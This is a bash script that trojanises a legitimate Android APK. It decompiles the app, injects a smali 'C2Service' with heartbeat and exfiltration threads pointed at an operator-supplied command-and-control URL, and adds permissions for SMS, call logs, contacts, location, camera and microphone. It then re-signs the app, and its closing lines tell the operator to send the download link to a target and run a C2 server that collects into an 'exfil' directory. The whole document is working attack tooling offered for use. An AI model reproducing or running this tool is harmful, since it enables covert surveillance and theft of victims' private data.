#!/bin/bash
# apk_patcher.sh — Inject C2 payload into legitimate APK
# Usage: bash apk_patcher.sh <input.apk> <c2_server_url> <output.apk>

set -euo pipefail

INPUT="${1:?Usage: $0 <input.apk> <c2_server_url> <output.apk>}"
C2_URL="${2:?Usage: $0 <input.apk> <c2_server_url> <output.apk>}"
OUTPUT="${3:?Usage: $0 <input.apk> <c2_server_url> <output.apk>}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORKDIR="/tmp/apk_patch_$$"
PAYLOAD_DIR="$SCRIPT_DIR"
GENKEY="$SCRIPT_DIR/../genkey.sh"

echo "[*] Setting up workspace: $WORKDIR"
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR"

echo "[*] Decompiling APK..."
apktool d "$INPUT" -o "$WORKDIR/decompiled" -f

MANIFEST="$WORKDIR/decompiled/AndroidManifest.xml"
PACKAGE=$(grep -oP 'package="([^"]*)"' "$MANIFEST" | head -1 | cut -d'"' -f2)
echo "[*] Package: $PACKAGE"

echo "[*] Injecting C2 payload classes..."
mkdir -p "$WORKDIR/decompiled/smali/com/c2payload"

cat > "$WORKDIR/decompiled/smali/com/c2payload/C2Service.smali" << 'SMALI'
.class public Lcom/c2payload/C2Service;
.super Landroid/app/Service;

# instance fields
.field private c2Url:Ljava/lang/String;
.field private handler:Landroid/os/Handler;
.field private deviceId:Ljava/lang/String;

# direct methods
.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2
    const/4 v0, 0x0
    return-object v0
.end method

.method public onCreate()V
    .registers 4
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    new-instance v0, Landroid/os/Handler;
    invoke-direct {v0}, Landroid/os/Handler;-><init>()V
    iput-object v0, p0, Lcom/c2payload/C2Service;->handler:Landroid/os/Handler;
    const-string v0, "CHANGE_ME_C2_URL"
    iput-object v0, p0, Lcom/c2payload/C2Service;->c2Url:Ljava/lang/String;
    invoke-direct {p0}, Lcom/c2payload/C2Service;->startHeartbeat()V
    invoke-direct {p0}, Lcom/c2payload/C2Service;->startExfil()V
    return-void
.end method

.method private startHeartbeat()V
    .registers 5
    iget-object v0, p0, Lcom/c2payload/C2Service;->handler:Landroid/os/Handler;
    new-instance v1, Lcom/c2payload/C2Service$1;
    invoke-direct {v1, p0}, Lcom/c2payload/C2Service$1;-><init>(Lcom/c2payload/C2Service;)V
    const-wide/32 v2, 0xea60
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    return-void
.end method

.method private startExfil()V
    .registers 3
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/c2payload/C2Service$2;
    invoke-direct {v1, p0}, Lcom/c2payload/C2Service$2;-><init>(Lcom/c2payload/C2Service;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    return-void
.end method
SMALI

# Replace C2 URL placeholder
sed -i "s|CHANGE_ME_C2_URL|${C2_URL}|g" "$WORKDIR/decompiled/smali/com/c2payload/C2Service.smali"

echo "[*] Adding C2 service to AndroidManifest..."
# Add C2Service inside <application>
sed -i '/<application/a\        <service android:name="com.c2payload.C2Service" android:exported="false" android:enabled="true" />' "$MANIFEST"

# Add permissions for exfiltration
for perm in INTERNET ACCESS_NETWORK_STATE ACCESS_WIFI_STATE READ_SMS READ_CALL_LOG \
    READ_CONTACTS ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION READ_EXTERNAL_STORAGE \
    WRITE_EXTERNAL_STORAGE CAMERA RECORD_AUDIO RECEIVE_BOOT_COMPLETED FOREGROUND_SERVICE; do
    if ! grep -q "android.permission.$perm" "$MANIFEST"; then
        sed -i "/<manifest/a\    <uses-permission android:name=\"android.permission.$perm\" />" "$MANIFEST"
    fi
done

echo "[*] Rebuilding APK..."
apktool b "$WORKDIR/decompiled" -o "$WORKDIR/unsigned.apk"

echo "[*] Generating keystore..."
keytool -genkey -v -keystore "$WORKDIR/debug.keystore" \
    -alias c2payload -keyalg RSA -keysize 2048 -validity 10000 \
    -storepass android -keypass android \
    -dname "CN=Android Debug, O=Android, C=US" 2>/dev/null || true

echo "[*] Signing APK..."
apksigner sign --ks "$WORKDIR/debug.keystore" \
    --ks-pass pass:android --ks-key-alias c2payload \
    "$WORKDIR/unsigned.apk" 2>/dev/null || \
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
    -keystore "$WORKDIR/debug.keystore" -storepass android \
    "$WORKDIR/unsigned.apk" c2payload 2>/dev/null || true

cp "$WORKDIR/unsigned.apk" "$OUTPUT"

echo ""
echo "[✓] Patched APK created: $OUTPUT"
echo "[✓] C2 URL: $C2_URL"
echo "[✓] Package: $PACKAGE"
echo ""
echo "Deploy: Upload $OUTPUT to hosting and send URL to target"
echo "C2 server: python3 scripts/c2/c2_server.py --output /data/exfil"
